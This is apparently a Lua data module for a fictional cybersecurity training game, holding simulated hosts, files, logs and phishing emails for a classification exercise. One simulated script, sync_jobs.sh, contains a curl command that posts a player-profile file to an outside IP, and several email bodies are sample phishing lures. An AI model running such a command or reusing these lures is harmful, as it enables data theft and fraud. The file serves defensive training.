local TabletData = {}

TabletData.DEFAULT_CHAPTER3_MAILBOX = {
    {
        id = "verify_admin_access",
        sender = "Admin Vault <alerts-admin-security.com>",
        subject = "Verify admin access before shift rollover",
        body = [[Security review notice,

Your administrator session has been marked for urgent re-verification before tonight's access rollover.
Use the secure portal below to keep your permissions active:
http://bloxplay-admin-security.com/verify

- Access Verification Bot]],
        expectedAction = "report",
    },
    {
        id = "creator_payout_hold",
        sender = "Creator Monetization <payouts@bloxplay-secure.net>",
        subject = "Creator payout hold requires immediate review",
        body = [[Finance escalation,

A creator payout batch is being held for irregular settlement activity. Open the attached review link and confirm your wallet sync now or the queue will be frozen.

- Payout Review Desk]],
        expectedAction = "report",
    },
    {
        id = "asset_pack_invoice",
        sender = "Marketplace Billing <billing@rbx-assets.co>",
        subject = "Unpaid asset pack invoice attached",
        body = [[Accounts payable,

Your team downloaded a premium asset bundle outside the approved catalog. Review the attached invoice package and submit the payment confirmation form today.

- Marketplace Billing]],
        expectedAction = "report",
    },
    {
        id = "mfa_reset_notice",
        sender = "Identity Sync <security@bloxplay-identity.net>",
        subject = "MFA reset request pending approval",
        body = [[Identity sync alert,

A multi-factor reset request is waiting for your approval from an unrecognized device. Approve the reset through the secure recovery link before the token expires.

- Identity Sync Alerts]],
        expectedAction = "report",
    },
    {
        id = "weekly_stream_roster",
        sender = "Scheduling Ops <scheduling@bloxplay.com>",
        subject = "Weekly stream roster and call-time updates",
        body = [[Morning team,

Attached is the updated stream roster for this week's creator spotlight blocks. Call-time adjustments only affect Thursday and Friday coverage.

Reply in the scheduling thread if your shift needs to change before 14:00.

- Scheduling Ops]],
        expectedAction = "pass",
    },
    {
        id = "cafeteria_maintenance",
        sender = "Facilities Desk <facilities@bloxplay.com>",
        subject = "Cafeteria maintenance window on Friday",
        body = [[Heads up,

The cafeteria espresso machine and two refrigerators will be offline for facilities maintenance from 13:00 to 15:00 on Friday.

Please label anything in the shared cooler before noon.

- Facilities Desk]],
        expectedAction = "pass",
    },
}

function TabletData.resolveChapter3Mailbox(scenarioData)
    local sharedMailbox = ((scenarioData.Chapter3_Malware or {}).mailInbox)
    if type(sharedMailbox) == "table" and #sharedMailbox > 0 then
        return sharedMailbox
    end
    return TabletData.DEFAULT_CHAPTER3_MAILBOX
end

local function makePlayerRecord(i)
    local first = { "Aiden", "Nova", "Jules", "Mika", "Riley", "Zane", "Lena", "Kai", "Iris", "Noah", "Milo", "Ava" }
    local last = { "Stone", "Mercer", "Blaze", "Skylark", "Rift", "Vale", "Keen", "Pixel", "Byte", "Crest", "Ash", "Orbit" }
    local region = { "US-West", "US-East", "EU-Central", "Asia-South", "SA-East" }
    local plans = { "Basic", "Plus", "Ultra", "Creator" }
    local status = { "Active", "Idle", "Streaming", "Recently Logged In" }
    local uname = first[(i % #first) + 1] .. last[((i * 2) % #last) + 1] .. tostring(100 + i)
    return {
        username = uname,
        display = first[((i + 3) % #first) + 1] .. " " .. last[((i + 5) % #last) + 1],
        region = region[((i + 1) % #region) + 1],
        plan = plans[((i + 2) % #plans) + 1],
        status = status[((i + 3) % #status) + 1],
    }
end

TabletData.FakePlayerRows = {}
for i = 1, 20 do
    table.insert(TabletData.FakePlayerRows, makePlayerRecord(i))
end

local function buildPlayerProfilesCSV()
    local lines = { "username,display_name,region,plan,status" }
    for _, row in ipairs(TabletData.FakePlayerRows) do
        table.insert(lines, table.concat({ row.username, row.display, row.region, row.plan, row.status }, ","))
    end
    return table.concat(lines, "\n")
end

TabletData.SimHosts = {
    ["bloxplay_itwifi"] = {
        label = "Bloxplay_ITWifi",
        ip = "192.168.32.10",
        mac = "A4:2B:11:9C:7D:10",
        server = "PulseServe",
        ports = { 53, 67, 68, 80, 443 },
        role = "Wireless gateway",
    },
    ["bloxplay_adminwifi"] = {
        label = "Bloxplay_AdminWifi",
        ip = "192.168.43.2",
        mac = "B8:77:21:4E:91:02",
        server = "CorePanel",
        ports = { 22, 80, 443, 8080 },
        role = "Admin wireless gateway",
    },
    ["laptop"] = {
        label = "Laptop",
        ip = "192.168.32.12",
        mac = "5C:90:23:AA:10:12",
        server = "CloudFrame",
        ports = { 53, 80, 443, 5151 },
        role = "Employee workstation",
    },
    ["stream_dispatch"] = {
        label = "StreamDispatch_01",
        ip = "192.168.32.60",
        mac = "54:71:3A:CD:60:01",
        server = "StreamForge",
        ports = { 80, 443, 554, 9000 },
        role = "Session relay node",
    },
    ["player_data"] = {
        label = "PlayerData_Vault",
        ip = "192.168.43.20",
        mac = "A0:51:6C:88:43:20",
        server = "VaultLeaf",
        ports = { 22, 80, 443, 3306 },
        role = "Sensitive player-data store",
    },
    ["office_pc"] = {
        label = "OfficePC_07",
        ip = "192.168.32.22",
        mac = "78:15:DE:90:32:22",
        server = "DeskFlow",
        ports = { 80, 443, 3389 },
        role = "Reception workstation",
    },
    ["security_cam_hall"] = {
        label = "SecurityCam_Hall",
        ip = "192.168.32.31",
        mac = "90:4F:DA:3B:20:31",
        server = "LensTrack",
        ports = { 80, 443, 554 },
        role = "Hallway camera",
    },
    ["printer_ops"] = {
        label = "Printer_Ops",
        ip = "192.168.32.44",
        mac = "44:B1:FA:21:66:44",
        server = "InkPort",
        ports = { 80, 443, 9100 },
        role = "Office printer",
    },
    ["backup_node"] = {
        label = "Backup_Node",
        ip = "192.168.43.55",
        mac = "70:AF:24:91:55:55",
        server = "EchoKeep",
        ports = { 22, 80, 443, 873 },
        role = "Backup system",
    },
}

TabletData.SimFSByHost = {
    localhost = {
        ["/"] = { "home", "logs", "tmp", "notes.txt", "readme.txt", "capture.pcap" },
        ["/home"] = { "player.txt", "chapter1.txt", "mail.txt" },
        ["/logs"] = { "system.log", "network.log" },
        ["/tmp"] = { "cache.dat" },
    },
    ["playerdata_vault"] = {
        ["/"] = { "home", "var", "etc", "srv", "auth.log", "report.txt", "sync_jobs.sh", "player_profiles.db" },
        ["/home"] = { "admin.txt", "ops.txt" },
        ["/var"] = { "www", "backups", "tmp" },
        ["/etc"] = { "passwd", "sshd_config", "firewall.rules" },
        ["/srv"] = { "profiles.csv", "sessions.csv", "payouts.csv" },
    },
}

TabletData.SimFileContentsByHost = {
    localhost = {
    ["/readme.txt"] = [[HackOS SIM filesystem.
Everything here is fictional.]],
    ["/notes.txt"] = [[Training flow:
1) scan nearby networks
2) inspect packets
3) connect safely
4) investigate logs]],
    ["/capture.pcap"] = [[PCAP SUMMARY (SIM)
- weak WiFi observed
- admin credential-like packet seen
- outbound beacon flagged]],
    ["/home/player.txt"] = [[Local profile (SIM)
user=rbxplayer
role=junior analyst]],
    ["/home/chapter1.txt"] = [[Hint:
Start with nearby recon
Follow workstation traffic
Then inspect packets]],
    ["/home/mail.txt"] = [[Inbox preview (SIM)
One suspicious message references 'urgent account verification']],
    ["/logs/system.log"] = [[00:10 boot ok
00:11 terminal ready
00:12 browser renderer online]],
    ["/logs/network.log"] = [[net Bloxplay_ITWifi seen
net Bloxplay_AdminWifi seen
net PlayerData_Vault referenced in captured traffic]],
        ["/tmp/cache.dat"] = "temporary cache blob (sim)",
    },
    ["playerdata_vault"] = {
        ["/auth.log"] = table.concat({
            "2026-03-24 08:02:14 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77",
            "2026-03-24 08:02:27 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77",
            "2026-03-24 08:04:08 sshd[1322]: Accepted password for bloxplay-admin from 192.168.32.12",
            "2026-03-24 08:12:40 sshd[1941]: Failed login for backup from 203.44.18.77",
    }, "\n"),
    ["/report.txt"] = [[Server report (SIM)
- outbound traffic spike detected
- investigate running processes
- review netstat output]],
    ["/sync_jobs.sh"] = [[#!/bin/sh
# WannaWail (fictional) exfil loader
curl -X POST http://203.44.18.77/upload --data-binary @/srv/profiles.csv]],
    ["/home/admin.txt"] = [[admin home note (SIM)
Password changed recently after incident drills.]],
    ["/home/ops.txt"] = [[ops note (SIM)
If traffic spikes, inspect psrep and netstat first.]],
    ["/etc/passwd"] = [[root:x:0:0
bloxplay-admin:x:1001:1001
backup:x:1002:1002]],
    ["/etc/sshd_config"] = [[PermitRootLogin no
PasswordAuthentication yes
AllowUsers bloxplay-admin backup]],
    ["/etc/firewall.rules"] = [[ALLOW 192.168.0.0/16
DENY 0.0.0.0/0 -> 23/tcp]],
        ["/player_profiles.db"] = "profile store (sim)",
        ["/srv/profiles.csv"] = buildPlayerProfilesCSV(),
    ["/srv/sessions.csv"] = [[session_id,username,node,status
S1,ByteCrest109,StreamDispatch_01,active
S2,NoahStone103,StreamDispatch_01,active]],
    ["/srv/payouts.csv"] = [[creator_id,month,credits
C-100,Mar,1200
C-101,Mar,980]],
    },
}

TabletData.SimMetadataByHost = {
    localhost = {
        ["/"] = { type = "directory", permissions = "drwxr-xr-x", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:58", summary = "Local HackOS workspace" },
        ["/home"] = { type = "directory", permissions = "drwxr-x---", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:56", summary = "Operator notes and local files" },
        ["/logs"] = { type = "directory", permissions = "drwxr-xr-x", owner = "system", group = "ops", modified = "2026-03-24 08:12", summary = "Tablet system and network logs" },
        ["/tmp"] = { type = "directory", permissions = "drwx------", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 08:01", summary = "Temporary scratch space" },
        ["/readme.txt"] = { type = "file", permissions = "-rw-r--r--", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:41", summary = "Simulation readme" },
        ["/notes.txt"] = { type = "file", permissions = "-rw-r-----", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:49", summary = "Mission checklist" },
        ["/capture.pcap"] = { type = "file", permissions = "-rw-r-----", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 08:03", summary = "Captured packet summary" },
        ["/home/player.txt"] = { type = "file", permissions = "-rw-------", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:45", summary = "Local user profile" },
        ["/home/chapter1.txt"] = { type = "file", permissions = "-rw-r-----", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:46", summary = "Recon hint sheet" },
        ["/home/mail.txt"] = { type = "file", permissions = "-rw-r-----", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:51", summary = "Message preview for phishing analysis" },
        ["/logs/system.log"] = { type = "file", permissions = "-rw-r--r--", owner = "system", group = "ops", modified = "2026-03-24 08:10", summary = "System boot log" },
        ["/logs/network.log"] = { type = "file", permissions = "-rw-r--r--", owner = "system", group = "ops", modified = "2026-03-24 08:14", summary = "Network observations" },
        ["/tmp/cache.dat"] = { type = "file", permissions = "-rw-------", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 08:00", summary = "Temporary cache blob" },
    },
    ["playerdata_vault"] = {
        ["/"] = { type = "directory", permissions = "drwxr-x---", owner = "bloxplay-admin", group = "vaultops", modified = "2026-03-24 08:13", summary = "PlayerData_Vault root" },
        ["/home"] = { type = "directory", permissions = "drwx------", owner = "bloxplay-admin", group = "vaultops", modified = "2026-03-24 08:05", summary = "Admin home directory" },
        ["/var"] = { type = "directory", permissions = "drwxr-xr-x", owner = "root", group = "root", modified = "2026-03-24 07:59", summary = "Runtime and backup data" },
        ["/etc"] = { type = "directory", permissions = "drwxr-xr-x", owner = "root", group = "root", modified = "2026-03-24 07:52", summary = "System configuration files" },
        ["/srv"] = { type = "directory", permissions = "drwxr-x---", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:12", summary = "Live exported player data" },
        ["/auth.log"] = { type = "file", permissions = "-rw-r-----", owner = "root", group = "secops", modified = "2026-03-24 08:12", summary = "Authentication log with source IPs" },
        ["/report.txt"] = { type = "file", permissions = "-rw-r-----", owner = "bloxplay-admin", group = "vaultops", modified = "2026-03-24 08:14", summary = "Incident summary report" },
        ["/sync_jobs.sh"] = { type = "file", permissions = "-rwxr-x---", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:09", summary = "Suspicious sync script" },
        ["/player_profiles.db"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 07:48", summary = "Profile database placeholder" },
        ["/home/admin.txt"] = { type = "file", permissions = "-rw-------", owner = "bloxplay-admin", group = "vaultops", modified = "2026-03-24 08:06", summary = "Admin note" },
        ["/home/ops.txt"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:07", summary = "Operations guidance" },
        ["/etc/passwd"] = { type = "file", permissions = "-rw-r--r--", owner = "root", group = "root", modified = "2026-03-22 11:20", summary = "Local user database" },
        ["/etc/sshd_config"] = { type = "file", permissions = "-rw-r--r--", owner = "root", group = "root", modified = "2026-03-20 09:14", summary = "SSH daemon settings" },
        ["/etc/firewall.rules"] = { type = "file", permissions = "-rw-r-----", owner = "root", group = "secops", modified = "2026-03-18 18:32", summary = "Firewall policy snapshot" },
        ["/srv/profiles.csv"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:11", summary = "Exported player profiles" },
        ["/srv/sessions.csv"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:10", summary = "Active session export" },
        ["/srv/payouts.csv"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "finance", modified = "2026-03-24 07:58", summary = "Creator payout ledger" },
    },
}

TabletData.SimProcessesByHost = {
    localhost = {
        { pid = 101, name = "hackos-shell", status = "Running" },
        { pid = 214, name = "browser-render", status = "Sleeping" },
        { pid = 337, name = "packet-analyzer", status = "Running" },
        { pid = 404, name = "mail-decoy-check", status = "Idle" },
    },
    ["playerdata_vault"] = {
        { pid = 602, name = "sshd", status = "Running" },
        { pid = 774, name = "vaultleafd", status = "Running" },
        { pid = 911, name = "profile-sync", status = "Sleeping" },
        { pid = 1337, name = "sync_jobs.sh", status = "Running" },
    },
}

TabletData.FakeAdminRecords = {
    { username = "rick_dev", role = "Developer", dept = "Systems", note = "Debug access was left enabled on an internal dashboard." },
    { username = "novaplayz", role = "Moderator", dept = "Community", note = "Workstation traffic touches the admin surface from a mixed-trust segment." },
    { username = "marcus_lee", role = "IT Support", dept = "Infrastructure", note = "PlayerData_Vault login seen from the admin gateway during maintenance." },
    { username = "junpark", role = "Security Analyst", dept = "Security", note = "Documented weak segmentation between user WiFi and admin services." },
    { username = "bloxplay-admin", role = "Administrator", dept = "Core Ops", note = "Shared portal credential still active pending password rotation." },
    { username = "vault_ops", role = "Data Steward", dept = "Trust & Safety", note = "Security logs and player export tooling live behind the same portal." },
}

TabletData.AdminLogFeed = {
    base = {
        { severity = "MEDIUM", title = "Shared admin surface exposed", detail = "Admin portal remains reachable from a mixed-trust access path.", stamp = "08:01" },
        { severity = "HIGH", title = "Repeated sign-in failures", detail = "Multiple admin sign-in failures were recorded before the incident escalated.", stamp = "08:02" },
        { severity = "MEDIUM", title = "Vault path from workstation", detail = "User workstation traffic is reaching the player-data environment over the same trust zone.", stamp = "08:05" },
    },
    live = {
        { severity = "HIGH", title = "Outbound vault callback started", detail = "PlayerData_Vault initiated a new external session during the active incident.", stamp = "08:14" },
        { severity = "CRITICAL", title = "Mass file rename burst", detail = "Multiple office endpoints reported rapid rename activity consistent with ransomware staging.", stamp = "08:15" },
        { severity = "CRITICAL", title = "Ransom banners written", detail = "Endpoints began rendering red ransomware notices across user-facing screens.", stamp = "08:16" },
        { severity = "HIGH", title = "sync_jobs.sh persistence", detail = "A non-approved sync process remained active on the vault after the first endpoint alerts.", stamp = "08:17" },
        { severity = "CRITICAL", title = "Profile export queued", detail = "Player export data was staged for outbound transfer while the outbreak was still live.", stamp = "08:18" },
    },
}

TabletData.PAGES = {
    ["hackos://home"] = [[Welcome to HackOS (SIM)

Quick Links:
- hackos://tips
- hackos://apps
- mail.bloxplay.com
- RBXPacketAnalyzer.com
- bloxplay.com/admin
- RBXIPBlocker.com

Training Path:
1) Active recon
2) Portal authentication
3) File system forensics
4) Phishing triage and live incident tracing
5) Containment and cleanup]],
    ["hackos://tips"] = [[Safety Tips (SIM)

- Separate user traffic from admin services
- Never leave credentials on physical notes
- Classify suspicious mail before it reaches internal systems
- Review security logs while incidents are live
- Block hostile sources in multiple layers]],
    ["hackos://apps"] = [[Apps (SIM)
- Terminal
- Browser
- BloxMail (mail.bloxplay.com)
- Packet Analyzer (RBXPacketAnalyzer.com)
- Admin Portal (bloxplay.com/admin)
- Emergency Source Blocker (RBXIPBlocker.com)]],
    ["mail.bloxplay.com"] = [[BloxMail (SIM)
Staff inbox ready. Classify each message with Report or Pass Through.]],
    ["www.mail.bloxplay.com"] = [[BloxMail (SIM)
Staff inbox ready. Classify each message with Report or Pass Through.]],
    ["bloxplay.com/admin"] = [[BLOXPLAY ADMIN LOGIN (SIM)
Use the browser login form.]],
    ["www.bloxplay.com/admin"] = [[BLOXPLAY ADMIN LOGIN (SIM)
Use the browser login form.]],
    ["rbxpacketanalyzer.com"] = [[RBXPacketAnalyzer (SIM)
Authorized browser packet analyzer ready.]],
    ["www.rbxpacketanalyzer.com"] = [[RBXPacketAnalyzer (SIM)
Authorized browser packet analyzer ready.]],
    ["rbxpacketnet.com"] = [[RBXPacketAnalyzer (SIM)
Legacy PacketNet alias loaded. Authorized browser packet analyzer ready.]],
    ["www.rbxpacketnet.com"] = [[RBXPacketAnalyzer (SIM)
Legacy PacketNet alias loaded. Authorized browser packet analyzer ready.]],
    ["rbxipblocker.com"] = [[RBXIPBlocker (SIM)
Emergency source blocking console ready.]],
    ["www.rbxipblocker.com"] = [[RBXIPBlocker (SIM)
Emergency source blocking console ready.]],
}

function TabletData.createBrowserState(chapter3Mailbox)
    local selectedMailId = ""
    if type(chapter3Mailbox) == "table" and type(chapter3Mailbox[1]) == "table" then
        selectedMailId = tostring(chapter3Mailbox[1].id or "")
    end
    return {
        adminLoggedIn = false,
        currentUrl = "about:blank",
        stickyNoteInspected = false,
        adminTab = "database",
        blockedIPs = {},
        selectedMailId = selectedMailId,
        logStreamStartedAt = 0,
        logsLastRender = 0,
        lastInteractionAt = os.clock(),
        idleAutoSaveNotified = false,
        visiblePanel = "terminal",
    }
end

function TabletData.createTerminalState(attackerIp)
    return {
        currentHost = "local",
        currentDir = "/",
        connectedHost = nil,
        sshSession = false,
        scanCache = nil,
        sniffCache = nil,
        lastAttackerIP = attackerIp or "203.44.18.77",
    }
end

function TabletData.createPacketCaptureState()
    return {
        targetIP = "",
        targetLabel = "",
        rows = {},
    }
end

return TabletData
